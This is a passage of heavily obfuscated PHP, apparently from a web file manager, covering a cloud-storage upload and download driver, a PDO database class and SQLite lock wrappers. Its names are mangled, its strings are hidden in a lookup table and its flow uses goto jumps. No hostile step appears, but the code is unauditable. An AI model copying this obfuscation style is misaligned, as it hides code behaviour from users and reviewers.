($ÁÇ½ÛÕÖ > 0) { $äŠ¾¦Ğê = $¾ß‰Ü¶ù + $ÁÇ½ÛÕÖ - 1; $´Üê = array($Û€€¹[1431] . $¾ß‰Ü¶ù . $Û€€¹[456] . $äŠ¾¦Ğê); } $Ü¸¯§¼Ó = url_request($€ÈÇ»×ø, $Û€€¹[229], !1, $´Üê); return $Ü¸¯§¼Ó[$Û€€¹[748]] ? $Ü¸¯§¼Ó[$Û€€¹[1191]] : !1; } public function upload($èâªŸÄ•, $ìŸÌÇÕí, $ Æ˜Ï¿² = false, $Œá¯ù‡ = REPEAT_REPLACE) { $Œ„¥Ü… =& $_SERVER[Ôó‡è­ƒ]; $ÔÉ°İ¡ï = IO::size($ìŸÌÇÕí); if ($ÔÉ°İ¡ï <= 1024 * 1024 * 200) { $¾¬ÔğêÅ = array($Œ„¥Ü…[1472] . $ìŸÌÇÕí); $Æ”‚Ä÷ë = $this->ussRequest($èâªŸÄ•, $Œ„¥Ü…[227], $¾¬ÔğêÅ); return $Æ”‚Ä÷ë[$Œ„¥Ü…[1189]] ? $this->getPathOuter($èâªŸÄ•) : !1; } $ªÀ½ïã© = 1024 * 1024 * 10; $±ëóÎ¦ó = array($Œ„¥Ü…[1473], $Œ„¥Ü…[1474] . $ÔÉ°İ¡ï, $Œ„¥Ü…[1475], $Œ„¥Ü…[1476] . $ªÀ½ïã©); $Æ”‚Ä÷ë = $this->ussRequest($èâªŸÄ•, $Œ„¥Ü…[227], !1, $±ëóÎ¦ó); if (!$Æ”‚Ä÷ë[$Œ„¥Ü…[1189]]) { return !1; } $äì™Öƒ‹ = $Æ”‚Ä÷ë[$Œ„¥Ü…[1191]]; $çş½øÆÒ = 0; $€ÂÜúÊÌ = $äì™Öƒ‹[$Œ„¥Ü…[1477]]; $¶‡Öúµ¾ = fopen($ìŸÌÇÕí, $Œ„¥Ü…[1380]); if (!$¶‡Öúµ¾) { return !1; } do { $­¼À·¥ = $äì™Öƒ‹[$Œ„¥Ü…[1478]]; fseek_64($¶‡Öúµ¾, $çş½øÆÒ); $¼«‘‹½É = fread($¶‡Öúµ¾, $­¼À·¥); $ª¬ğóÂİ = 0; do { $ª¬ğóÂİ++; $äì™Öƒ‹ = $this->uploadPart($èâªŸÄ•, $äì™Öƒ‹, $¼«‘‹½É); } while (!$äì™Öƒ‹ && $ª¬ğóÂİ < 3); if (!$äì™Öƒ‹) { return !1; } $€ÂÜúÊÌ = $äì™Öƒ‹[$Œ„¥Ü…[1477]]; $çş½øÆÒ += $­¼À·¥; } while ($€ÂÜúÊÌ != -1); fclose($¶‡Öúµ¾); $±ëóÎ¦ó = array($Œ„¥Ü…[1479], $Œ„¥Ü…[1480] . $äì™Öƒ‹[$Œ„¥Ü…[1481]], $Œ„¥Ü…[1475]); $Æ”‚Ä÷ë = $this->ussRequest($èâªŸÄ•, $Œ„¥Ü…[227], !1, $±ëóÎ¦ó); return $Æ”‚Ä÷ë[$Œ„¥Ü…[1189]] ? $this->getPathOuter($ŠĞ£”Ç½) : !1; } private function uploadPart($åâåÅÈï, $±É†ˆ½à, &$¯÷Ÿ¤) { $Şšãùø¼ =& $_SERVER[Ôó‡è­ƒ]; $í×ˆÖèŠ = array($Şšãùø¼[1482], $Şšãùø¼[1480] . $±É†ˆ½à[$Şšãùø¼[1481]], $Şšãùø¼[1483] . $±É†ˆ½à[$Şšãùø¼[1477]], $Şšãùø¼[143] . $±É†ˆ½à[$Şšãùø¼[1478]]); $·çÌø¢™ = $this->ussRequest($åâåÅÈï, $Şšãùø¼[227], $¯÷Ÿ¤, $í×ˆÖèŠ); return !$·çÌø¢™[$Şšãùø¼[1189]] ? $·çÌø¢™[$Şšãùø¼[1189]] : $·çÌø¢™[$Şšãùø¼[1191]]; } public function uploadFormData($œØí¾, $Á«®Š­ = 3600) { return $this->uploadPolicy($œØí¾, $Á«®Š­); } public function multiUploadFormData($¯ìıÓ‰¡, $àª­‘ñ† = 3600) { $™Íş¢Ìü =& $_SERVER[Ôó‡è­ƒ]; $ğ£Ş«´Â = (int) $GLOBALS[$™Íş¢Ìü[7]][$™Íş¢Ìü[80]]; return $this->uploadPolicy($¯ìıÓ‰¡, $àª­‘ñ†, $ğ£Ş«´Â); } private function uploadPolicy($çˆŒİé², $àÁ×Íî› = 3600, $ÉêÕ‡ğù = 0) { $Õõ‚ê‡ =& $_SERVER[Ôó‡è­ƒ]; $„Éµ„Î½ = $Õõ‚ê‡[8] . $this->bucket; $ÌÇœÙ°ô = gmdate($Õõ‚ê‡[1416]); $¦½Ù™çÁ = array($Õõ‚ê‡[1484] => $this->bucket, $Õõ‚ê‡[1485] => $çˆŒİé², $Õõ‚ê‡[1486] => time() + $àÁ×Íî›, $Õõ‚ê‡[1487] => $ÌÇœÙ°ô); if ($ÉêÕ‡ğù) { $¦½Ù™çÁ[$Õõ‚ê‡[1396]] = $ÉêÕ‡ğù; } $ÏëÄ»Õ = base64_encode(json_encode($¦½Ù™çÁ)); $€ËéÌÈ¾ = base64_encode(hash_hmac($Õõ‚ê‡[1454], "\120\x4f\123\x54\x26{$„Éµ„Î½}\46{$ÌÇœÙ°ô}\x26{$ÏëÄ»Õ}", md5("{$this->userpass}"), !0)); $–îóòĞÌ = array($Õõ‚ê‡[1320] => $ÏëÄ»Õ, $Õõ‚ê‡[1488] => "\125\120\131\125\x4e\40{$this->username}\x3a{$€ËéÌÈ¾}", $Õõ‚ê‡[178] => $this->endpoint . $„Éµ„Î½); return $–îóòĞÌ; } public function download($å·«·¸Æ, $ÏËİàÙş) { $ÄúïÖ¬‘ = IO::getPathInner(IO::mkfile($ÏËİàÙş)); if (!($°Ù§ï’ü = $this->link($å·«·¸Æ))) { return !1; } $İå±ëÏ = 0; $Ô„†¤áŠ = 1024 * 200; $ÙïàÔ¡Í = fopen($ÄúïÖ¬‘, $_SERVER[Ôó‡è­ƒ][1437]); while (!0) { $ŠŠ°¢©¾ = $this->fileSubstr($å·«·¸Æ, $İå±ëÏ, $Ô„†¤áŠ); if ($ŠŠ°¢©¾ === !1) { return !1; } fwrite($ÙïàÔ¡Í, $ŠŠ°¢©¾); $İå±ëÏ += $Ô„†¤áŠ; if (strlen($ŠŠ°¢©¾) < $Ô„†¤áŠ) { break; } } fclose($ÙïàÔ¡Í); return $ÏËİàÙş; } public function link($ò¡ééö®, $ş˜£°†³ = array()) { $¾Æ˜İù =& $_SERVER[Ôó‡è­ƒ]; $ò¡ééö® = trim($ò¡ééö®, $¾Æ˜İù[8]); if (!empty($this->token)) { $ñ¸‚¤ûå = strtotime(date($¾Æ˜İù[1489])); $©ó­µÎÉ = substr(md5($this->token . $¾Æ˜İù[283] . $ñ¸‚¤ûå . $¾Æ˜İù[1490] . $ò¡ééö®), 12, 8) . $ñ¸‚¤ûå; $ş˜£°†³[] = $¾Æ˜İù[1491] . $©ó­µÎÉ; } $‡®íğ…Õ = !empty($ş˜£°†³) ? $¾Æ˜İù[73] . implode($¾Æ˜İù[283], $ş˜£°†³) : $¾Æ˜İù[12]; return $this->getHost() . $¾Æ˜İù[8] . $ò¡ééö® . $‡®íğ…Õ; } public function fileOut($ğ…­’ Ì, $„Ûö­±… = false, $Óú¥ÔÂ = false, $Ø¦Ì¤ŸÓ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ğ…­’ Ì, $„Ûö­±…, $Óú¥ÔÂ, $Ø¦Ì¤ŸÓ); } if (!$Óú¥ÔÂ) { $Óú¥ÔÂ = $this->pathThis($ğ…­’ Ì); } $¹ÎŠ­»™ = $„Ûö­±… ? array($_SERVER[Ôó‡è­ƒ][1492] . rawurlencode($Óú¥ÔÂ)) : array(); $ÈóÓÁ£¿ = $this->link($ğ…­’ Ì, $¹ÎŠ­»™); $this->fileOutLink($ÈóÓÁ£¿); } public function fileOutServer($ïÁœÎ†î, $ØŞ„ÉÇò = false, $Ùêû›õ = false, $³Æ‚ëŸé = '') { parent::fileOut($ïÁœÎ†î, $ØŞ„ÉÇò, $Ùêû›õ, $³Æ‚ëŸé); } public function fileOutImage($«Ø§ÃŞ”, $²Ø¶¼© = 250) { $õŞñ¸‘¸ = $this->link($«Ø§ÃŞ” . $_SERVER[Ôó‡è­ƒ][1493] . $²Ø¶¼©); $this->fileOutLink($õŞñ¸‘¸); } public function fileOutImageServer($©¯µ†, $ÏËÁâ¹ = 250) { parent::fileOutImage($©¯µ†, $ÏËÁâ¹); } public function hashMd5($¹òÂ«¿€) { $ä¡›·‰ =& $_SERVER[Ôó‡è­ƒ]; $ú”åƒ«Ï = $this->_objectMeta($¹òÂ«¿€); return isset($ú”åƒ«Ï[$ä¡›·‰[211]]) ? $ú”åƒ«Ï[$ä¡›·‰[211]] : !1; } public function size($ıç±¬‚) { $„íÂ›Íû = $this->objectMeta($ıç±¬‚); return $„íÂ›Íû ? $„íÂ›Íû[$_SERVER[Ôó‡è­ƒ][80]] : 0; } public function info($Å´°—£ô) { if ($this->isFolder($Å´°—£ô)) { return $this->folderInfo($Å´°—£ô); } else { if ($this->isFile($Å´°—£ô)) { return $this->fileInfo($Å´°—£ô); } } return !1; } public function exist($ñÌö¢¸”) { return $this->isFile($ñÌö¢¸”) || $this->isFolder($ñÌö¢¸”); } public function isFile($á®Ú˜—) { return !$this->isFolder($á®Ú˜—) && $this->objectMeta($á®Ú˜—); } public function isFolder($Ïë¸Œ¼¶) { return $this->cacheMethod($_SERVER[Ôó‡è­ƒ][202], $Ïë¸Œ¼¶); } protected function objectMeta($àÔ«è­í) { return $this->cacheMethod($_SERVER[Ôó‡è­ƒ][203], $àÔ«è­í); } protected function _objectMeta($…‹î±™“) { $½×áî®‘ =& $_SERVER[Ôó‡è­ƒ]; if ($…‹î±™“ == $½×áî®‘[12] || $…‹î±™“ == $½×áî®‘[8]) { return array(); } $ıØ¢ëÎ = $this->ussRequest($…‹î±™“, $½×áî®‘[1494]); if (!$ıØ¢ëÎ[$½×áî®‘[1189]]) { return null; } $­Ñˆ˜Æê = isset($ıØ¢ëÎ[$½×áî®‘[1191]]) ? $ıØ¢ëÎ[$½×áî®‘[1191]] : array(); if (!isset($­Ñˆ˜Æê[$½×áî®‘[1495]])) { return null; } $ä¿õ€Ç = array($½×áî®‘[33] => isset($­Ñˆ˜Æê[$½×áî®‘[1495]]) ? $­Ñˆ˜Æê[$½×áî®‘[1495]] : null, $½×áî®‘[80] => isset($­Ñˆ˜Æê[$½×áî®‘[1496]]) ? $­Ñˆ˜Æê[$½×áî®‘[1496]] : null, $½×áî®‘[211] => isset($­Ñˆ˜Æê[$½×áî®‘[1497]]) ? $­Ñˆ˜Æê[$½×áî®‘[1497]] : null, $½×áî®‘[1464] => isset($­Ñˆ˜Æê[$½×áî®‘[1498]]) ? $­Ñˆ˜Æê[$½×áî®‘[1498]] : null); $ä¿õ€Ç[$½×áî®‘[1465]] = isset($­Ñˆ˜Æê[$½×áî®‘[1499]]) ? strtotime($­Ñˆ˜Æê[$½×áî®‘[1499]]) : $ä¿õ€Ç[$½×áî®‘[1464]]; return $ä¿õ€Ç; } protected function _isFolder($œàç¼) { $ĞÅ„ş”ñ =& $_SERVER[Ôó‡è­ƒ]; if ($œàç¼ == $ĞÅ„ş”ñ[12] || $œàç¼ == $ĞÅ„ş”ñ[8]) { return !0; } $çõ’“ = $this->_objectMeta($œàç¼); return isset($çõ’“[$ĞÅ„ş”ñ[33]]) && $çõ’“[$ĞÅ„ş”ñ[33]] == $ĞÅ„ş”ñ[79] ? !0 : !1; } } goto Ağ°åÄ¡ª¯; b…ƒ¼¶›Ğ‰: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ò§Óº¢ = '') { $õÀÃëè£ =& $_SERVER[Ôó‡è­ƒ]; if (!class_exists($õÀÃëè£[914])) { think_exception(think_lang($õÀÃëè£[14]) . $õÀÃëè£[915]); } if (!empty($Ò§Óº¢)) { $this->config = $Ò§Óº¢; if (empty($this->config[$õÀÃëè£[17]])) { $this->config[$õÀÃëè£[17]] = array(); } } } public function connect($¯Ã‹Õ¥ = '', $ÊÉ ãÖé = 0) { $•ÚÈÛµŒ =& $_SERVER[Ôó‡è­ƒ]; if (!isset($this->linkID[$ÊÉ ãÖé])) { if (empty($¯Ã‹Õ¥)) { $¯Ã‹Õ¥ = $this->config; } $ä®åãñì = !empty($¯Ã‹Õ¥[$•ÚÈÛµŒ[17]][$•ÚÈÛµŒ[18]]) ? $¯Ã‹Õ¥[$•ÚÈÛµŒ[17]][$•ÚÈÛµŒ[18]] : $this->pconnect; if ($ä®åãñì) { $¯Ã‹Õ¥[$•ÚÈÛµŒ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ÊÉ ãÖé] = new PDO($¯Ã‹Õ¥[$•ÚÈÛµŒ[916]], $¯Ã‹Õ¥[$•ÚÈÛµŒ[888]], $¯Ã‹Õ¥[$•ÚÈÛµŒ[889]], $¯Ã‹Õ¥[$•ÚÈÛµŒ[17]]); } catch (PDOException $Åé›µâÌ) { think_exception($Åé›µâÌ->getMessage()); } $this->dbType = $this->_getDsnType($¯Ã‹Õ¥[$•ÚÈÛµŒ[916]]); if (in_array($this->dbType, array($•ÚÈÛµŒ[917], $•ÚÈÛµŒ[918], $•ÚÈÛµŒ[919], $•ÚÈÛµŒ[920]))) { think_exception($•ÚÈÛµŒ[921] . $this->dbType . $•ÚÈÛµŒ[922] . $this->dbType . $•ÚÈÛµŒ[923]); } if (!$this->linkID[$ÊÉ ãÖé]) { think_exception($•ÚÈÛµŒ[924]); } try { $this->linkID[$ÊÉ ãÖé]->exec($•ÚÈÛµŒ[925] . think_config($•ÚÈÛµŒ[891])); } catch (Exception $Åé›µâÌ) { } $this->connected = !0; if (1 != think_config($•ÚÈÛµŒ[22])) { unset($this->config); } } return $this->linkID[$ÊÉ ãÖé]; } public function free() { $this->PDOStatement = null; } public function query($¾Ñ³şí, $£ÖØµÚá = array()) { $Ì ‘Ñ =& $_SERVER[Ôó‡è­ƒ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¾Ñ³şí; if (!empty($£ÖØµÚá)) { $this->queryStr .= $Ì ‘Ñ[926] . print_r($£ÖØµÚá, !0) . $Ì ‘Ñ[927]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ì ‘Ñ[23], 1); think_status($Ì ‘Ñ[24]); $this->PDOStatement = $this->_linkID->prepare($¾Ñ³şí); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ñ¤Ê³î¢ = $this->PDOStatement->execute($£ÖØµÚá); $this->debug(); if (!1 === $ñ¤Ê³î¢) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($è¤’×÷Ÿ, $ÃÒâÚë” = array()) { $–·ÄŒğ› =& $_SERVER[Ôó‡è­ƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $è¤’×÷Ÿ; if (!empty($ÃÒâÚë”)) { $this->queryStr .= $–·ÄŒğ›[926] . print_r($ÃÒâÚë”, !0) . $–·ÄŒğ›[927]; } $»ĞØÍ¹Û = !1; if ($this->dbType == $–·ÄŒğ›[920]) { if (preg_match($–·ÄŒğ›[928], $this->queryStr, $é¹Èù¯)) { $this->table = think_config($–·ÄŒğ›[929]) . str_ireplace(think_config($–·ÄŒğ›[930]), $–·ÄŒğ›[377], $é¹Èù¯[2]); $»ĞØÍ¹Û = (bool) $this->query($–·ÄŒğ›[931] . strtoupper($this->table) . $–·ÄŒğ›[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($–·ÄŒğ›[25], 1); think_status($–·ÄŒğ›[24]); $this->PDOStatement = $this->_linkID->prepare($è¤’×÷Ÿ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Ìü¾Õü¿ = $this->PDOStatement->execute($ÃÒâÚë”); $this->debug(); if (!1 === $Ìü¾Õü¿) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($»ĞØÍ¹Û || preg_match($–·ÄŒğ›[932], $è¤’×÷Ÿ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ò…¿ïâ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ò…¿ïâ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ñ•ñÔîÁ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ñ•ñÔîÁ) { $this->error(); return !1; } } return !0; } private function getAll() { $¿¿«åàè = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¿¿«åàè); return $¿¿«åàè; } public function getFields($ÁïÚ¾œã) { $ôš³²€è =& $_SERVER[Ôó‡è­ƒ]; $this->initConnect(!0); if (think_config($ôš³²€è[933])) { $¶’©‚»ø = str_replace($ôš³²€è[934], $ÁïÚ¾œã, think_config($ôš³²€è[933])); } else { switch ($this->dbType) { case $ôš³²€è[917]: case $ôš³²€è[935]: $¶’©‚»ø = "\123\x45\114\105\x43\x54\40\40\x20\143\x6f\x6c\165\x6d\156\x5f\156\x61\x6d\x65\40\141\163\40\x27\116\141\155\x65\47\54\x20\40\40\144\x61\164\141\x5f\164\x79\160\x65\x20\141\163\x20\47\x54\171\x70\x65\x27\54\x20\x20\x20\143\157\x6c\165\x6d\156\x5f\144\145\146\x61\x75\x6c\x74\x20\141\x73\x20\47\104\145\x66\141\165\154\x74\x27\x2c\x20\40\40\x69\163\137\156\x75\x6c\x6c\x61\142\x6c\x65\40\141\x73\x20\x27\116\165\154\154\47\12\11\11\x46\x52\x4f\x4d\x9\x69\x6e\x66\x6f\162\x6d\141\x74\x69\157\x6e\137\163\x63\x68\145\x6d\141\56\164\x61\x62\x6c\x65\x73\40\101\123\40\164\12\x9\11\112\x4f\x49\116\11\151\x6e\x66\x6f\162\155\x61\164\x69\x6f\x6e\x5f\163\143\150\x65\x6d\x61\x2e\x63\157\x6c\165\155\x6e\x73\x20\101\x53\x20\x63\xa\11\x9\117\116\x20\40\x74\x2e\x74\141\x62\x6c\x65\137\143\141\x74\x61\x6c\157\147\40\x3d\x20\143\56\164\x61\142\x6c\145\x5f\x63\x61\164\x61\x6c\157\147\12\x9\11\x41\116\104\x20\x74\56\x74\141\x62\154\145\x5f\x73\143\x68\145\155\141\x20\75\x20\x63\x2e\164\x61\142\154\x65\x5f\x73\x63\150\145\155\141\12\11\11\101\116\104\x20\164\x2e\164\141\142\x6c\x65\x5f\156\x61\x6d\145\40\75\x20\143\x2e\164\x61\142\x6c\145\x5f\156\141\x6d\x65\xa\11\x9\x57\110\105\x52\x45\x20\40\x20\x74\56\x74\x61\x62\154\x65\137\156\141\x6d\x65\40\75\40\x27{$ÁïÚ¾œã}\47"; break; case $ôš³²€è[936]: $¶’©‚»ø = $ôš³²€è[937] . $ÁïÚ¾œã . $ôš³²€è[938]; break; case $ôš³²€è[918]: case $ôš³²€è[920]: $¶’©‚»ø = $ôš³²€è[939] . $ôš³²€è[940] . $ôš³²€è[941] . strtoupper($ÁïÚ¾œã) . $ôš³²€è[942] . strtoupper($ÁïÚ¾œã) . $ôš³²€è[943]; break; case $ôš³²€è[944]: $¶’©‚»ø = $ôš³²€è[945] . $ÁïÚ¾œã . $ôš³²€è[946]; break; case $ôš³²€è[919]: break; case $ôš³²€è[947]: default: $¶’©‚»ø = $ôš³²€è[948] . ($this->dbType == $ôš³²€è[947] ? "\x60{$ÁïÚ¾œã}\x60" : $ÁïÚ¾œã); } } $•€ã¡æŞ = $this->query($¶’©‚»ø); $İ¡ôçåÎ = array(); if ($•€ã¡æŞ) { foreach ($•€ã¡æŞ as $êşÉ¤Ôí => $‚‚£‚Ä) { $‚‚£‚Ä = array_change_key_case($‚‚£‚Ä); $‚‚£‚Ä[$ôš³²€è[32]] = isset($‚‚£‚Ä[$ôš³²€è[32]]) ? $‚‚£‚Ä[$ôš³²€è[32]] : $ôš³²€è[377]; $‚‚£‚Ä[$ôš³²€è[33]] = isset($‚‚£‚Ä[$ôš³²€è[33]]) ? $‚‚£‚Ä[$ôš³²€è[33]] : $ôš³²€è[377]; $‰ËÛØƒ = isset($‚‚£‚Ä[$ôš³²€è[272]]) ? $‚‚£‚Ä[$ôš³²€è[272]] : $‚‚£‚Ä[$ôš³²€è[32]]; $İ¡ôçåÎ[$‰ËÛØƒ] = array($ôš³²€è[32] => $‰ËÛØƒ, $ôš³²€è[33] => $‚‚£‚Ä[$ôš³²€è[33]], $ôš³²€è[35] => (bool) (isset($‚‚£‚Ä[$ôš³²€è[104]]) && $‚‚£‚Ä[$ôš³²€è[104]] === $ôš³²€è[12] || isset($‚‚£‚Ä[$ôš³²€è[35]]) && $‚‚£‚Ä[$ôš³²€è[35]] === $ôš³²€è[12]), $ôš³²€è[37] => isset($‚‚£‚Ä[$ôš³²€è[37]]) ? $‚‚£‚Ä[$ôš³²€è[37]] : (isset($‚‚£‚Ä[$ôš³²€è[56]]) ? $‚‚£‚Ä[$ôš³²€è[56]] : $ôš³²€è[377]), $ôš³²€è[39] => isset($‚‚£‚Ä[$ôš³²€è[95]]) ? strtolower($‚‚£‚Ä[$ôš³²€è[95]]) == $ôš³²€è[41] : (isset($‚‚£‚Ä[$ôš³²€è[57]]) ? $‚‚£‚Ä[$ôš³²€è[57]] : !1), $ôš³²€è[42] => isset($‚‚£‚Ä[$ôš³²€è[949]]) ? strtolower($‚‚£‚Ä[$ôš³²€è[949]]) == $ôš³²€è[44] : (isset($‚‚£‚Ä[$ôš³²€è[95]]) ? $‚‚£‚Ä[$ôš³²€è[95]] : !1)); } } return $İ¡ôçåÎ; } public function getTables($×Ñğõš¥ = '') { $ıâíĞÈœ =& $_SERVER[Ôó‡è­ƒ]; if (think_config($ıâíĞÈœ[950])) { $±· Ì…À = str_replace($ıâíĞÈœ[951], $×Ñğõš¥, think_config($ıâíĞÈœ[950])); } else { switch ($this->dbType) { case $ıâíĞÈœ[918]: case $ıâíĞÈœ[920]: $±· Ì…À = $ıâíĞÈœ[952]; break; case $ıâíĞÈœ[917]: case $ıâíĞÈœ[935]: $±· Ì…À = $ıâíĞÈœ[953]; break; case $ıâíĞÈœ[944]: $±· Ì…À = $ıâíĞÈœ[954]; break; case $ıâíĞÈœ[919]: think_exception(think_lang($ıâíĞÈœ[955]) . $ıâíĞÈœ[956]); break; case $ıâíĞÈœ[936]: $±· Ì…À = $ıâíĞÈœ[45] . $ıâíĞÈœ[46] . $ıâíĞÈœ[47]; break; case $ıâíĞÈœ[947]: default: if (!empty($×Ñğõš¥)) { $±· Ì…À = $ıâíĞÈœ[899] . $×Ñğõš¥ . $ıâíĞÈœ[900]; } else { $±· Ì…À = $ıâíĞÈœ[901]; } } } $µ¡§´Ç = $this->query($±· Ì…À); $¶¹­ ›š = array(); foreach ($µ¡§´Ç as $·ª¯¿¼ê => $Ñ³µâ²¾) { $¶¹­ ›š[$·ª¯¿¼ê] = current($Ñ³µâ²¾); } return $¶¹­ ›š; } protected function parseLimit($Ş ëÔ°) { $æ­‡Ìœö =& $_SERVER[Ôó‡è­ƒ]; $èê¤æ³¿ = $æ­‡Ìœö[12]; if (!empty($Ş ëÔ°)) { switch ($this->dbType) { case $æ­‡Ìœö[944]: case $æ­‡Ìœö[936]: $Ş ëÔ° = explode($æ­‡Ìœö[50], $Ş ëÔ°); if (count($Ş ëÔ°) > 1) { $èê¤æ³¿ .= $æ­‡Ìœö[51] . $Ş ëÔ°[1] . $æ­‡Ìœö[52] . $Ş ëÔ°[0] . $æ­‡Ìœö[53]; } else { $èê¤æ³¿ .= $æ­‡Ìœö[51] . $Ş ëÔ°[0] . $æ­‡Ìœö[53]; } break; case $æ­‡Ìœö[917]: case $æ­‡Ìœö[935]: break; case $æ­‡Ìœö[919]: break; case $æ­‡Ìœö[918]: case $æ­‡Ìœö[920]: break; case $æ­‡Ìœö[947]: default: $èê¤æ³¿ .= $æ­‡Ìœö[51] . $Ş ëÔ° . $æ­‡Ìœö[53]; } } return $èê¤æ³¿; } public function parseKey(&$Ğ“«ú†Õ, $ìÒ ş½š = true) { $Â·Ì«îñ =& $_SERVER[Ôó‡è­ƒ]; if ($ìÒ ş½š) { $Ğ“«ú†Õ = $this->parseKeyCheck($Ğ“«ú†Õ); } if ($this->dbType == $Â·Ì«îñ[947]) { if ($Ğ“«ú†Õ != $Â·Ì«îñ[185] && !preg_match($Â·Ì«îñ[911], $Ğ“«ú†Õ)) { $Ğ“«ú†Õ = $Â·Ì«îñ[384] . trim($Ğ“«ú†Õ, $Â·Ì«îñ[384]) . $Â·Ì«îñ[384]; } return $Ğ“«ú†Õ; } else { return parent::parseKey($Ğ“«ú†Õ, $ìÒ ş½š); } } public function close() { $this->_linkID = null; } public function error() { $ü™Œ»— =& $_SERVER[Ôó‡è­ƒ]; if ($this->PDOStatement) { $Å˜ƒ‹º = $this->PDOStatement->errorInfo(); $this->error = $Å˜ƒ‹º[1] . $ü™Œ»—[4] . $Å˜ƒ‹º[2]; } else { $this->error = $ü™Œ»—[12]; } if ($ü™Œ»—[12] != $this->queryStr) { $this->error .= LNG($ü™Œ»—[48]) . $this->queryStr; } think_trace($this->error, $ü™Œ»—[12], $ü™Œ»—[49]); return $this->error; } public function escapeString($½Ü™Ğ¥±) { $ëìúîå” =& $_SERVER[Ôó‡è­ƒ]; switch ($this->dbType) { case $ëìúîå”[944]: case $ëìúîå”[917]: case $ëìúîå”[935]: case $ëìúîå”[947]: return addslashes($½Ü™Ğ¥±); case $ëìúîå”[919]: case $ëìúîå”[936]: case $ëìúîå”[918]: case $ëìúîå”[920]: return str_ireplace($ëìúîå”[58], $ëìúîå”[59], $½Ü™Ğ¥±); } } protected function parseValue($Å›ÁÊ²) { $üÙª¶öŒ =& $_SERVER[Ôó‡è­ƒ]; if (is_string($Å›ÁÊ²)) { $“õÈ’Òß = strpos($Å›ÁÊ², $üÙª¶öŒ[4]) === 0 && in_array($Å›ÁÊ², array_keys($this->bind)); $Å›ÁÊ² = $“õÈ’Òß ? $this->escapeString($Å›ÁÊ²) : $üÙª¶öŒ[957] . $this->escapeString($Å›ÁÊ²) . $üÙª¶öŒ[957]; } elseif (isset($Å›ÁÊ²[0]) && is_string($Å›ÁÊ²[0]) && strtolower($Å›ÁÊ²[0]) == $üÙª¶öŒ[296]) { $Å›ÁÊ² = $this->escapeString($Å›ÁÊ²[1]); } elseif (is_array($Å›ÁÊ²)) { $Å›ÁÊ² = array_map(array($this, $üÙª¶öŒ[958]), $Å›ÁÊ²); } elseif (is_bool($Å›ÁÊ²)) { $Å›ÁÊ² = $Å›ÁÊ² ? $üÙª¶öŒ[89] : $üÙª¶öŒ[194]; } elseif (is_null($Å›ÁÊ²)) { $Å›ÁÊ² = $üÙª¶öŒ[104]; } return $Å›ÁÊ²; } public function getLastInsertId() { $ü³Ã•Ã¡ =& $_SERVER[Ôó‡è­ƒ]; switch ($this->dbType) { case $ü³Ã•Ã¡[944]: case $ü³Ã•Ã¡[936]: case $ü³Ã•Ã¡[917]: case $ü³Ã•Ã¡[935]: case $ü³Ã•Ã¡[919]: case $ü³Ã•Ã¡[947]: return $this->_linkID->lastInsertId(); case $ü³Ã•Ã¡[918]: case $ü³Ã•Ã¡[920]: $­¡Ğ‘¨Œ = $this->table; $©ãªé” = $this->query("\123\105\114\105\103\124\x20{$­¡Ğ‘¨Œ}\x2e\143\x75\162\x72\166\141\154\x20\x63\x75\162\162\166\141\x6c\40\106\122\117\115\40\x64\165\x61\x6c"); return $©ãªé” ? $©ãªé”[0][$ü³Ã•Ã¡[959]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($†Ÿ¾³Ú) { $äÕ¿éĞù =& $_SERVER[Ôó‡è­ƒ]; if (!CacheLock::fileLock($äÕ¿éĞù[13])) { return !1; } $‰Ñµá¨¾ = parent::query($†Ÿ¾³Ú); CacheLock::fileUnLock($äÕ¿éĞù[13]); return $‰Ñµá¨¾; } public function execute($Ê–Áñåù) { $Áù‰¬ =& $_SERVER[Ôó‡è­ƒ]; if (!CacheLock::fileLock($Áù‰¬[13])) { return !1; } $ó€“âŠÈ = parent::execute($Ê–Áñåù); CacheLock::fileUnLock($Áù‰¬[13]); return $ó€“âŠÈ; } } class DbSqlite3 extends DbSqlite3Base { public function query($ç¿•äå¯) { $ò‰€Î÷³ =& $_SERVER[Ôó‡è­ƒ]; if (!CacheLock::fileLock($ò‰€Î÷³[13])) { return !1; } $‡õ¤””² = parent::query($ç¿•äå¯); CacheLock::fileUnLock($ò‰€Î÷³[13]); return $‡õ¤””²; } public function execute($¼õ‘¶ì±) { $ç®Õ‰ŠŠ =& $_SERVER[Ôó‡è­ƒ]; if (!CacheLock::fileLock($ç®Õ‰ŠŠ[13])) { return !1; } $¸—Ç«— = parent::execute($¼õ‘¶ì±); CacheLock::fileUnLock($ç®Õ‰ŠŠ[13]); return $¸—Ç«—; } } goto A½Ğ£´Ší; C–Á³‡à‹: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\146\141\166"; protected function cacheFunctionAlias($À×³Ñ«Œ) { $¿¿èÌ‹È =& $_SERVER[Ôó‡è­ƒ]; return array($¿¿èÌ‹È[1931] => array($À×³Ñ«Œ[0], $¿¿èÌ‹È[1932]), $¿¿èÌ‹È[1933] => array($À×³Ñ«Œ[0], $¿¿èÌ‹È[1934])); } protected function get($ß×ÄŞ•ı) { $ÍâÌÛì =& $_SERVER[Ôó‡è­ƒ]; $âøÄøİÁ = Model($ÍâÌÛì[518])->metaGet($ß×ÄŞ•ı, $ÍâÌÛì[1935]); $¦¶…Î² = 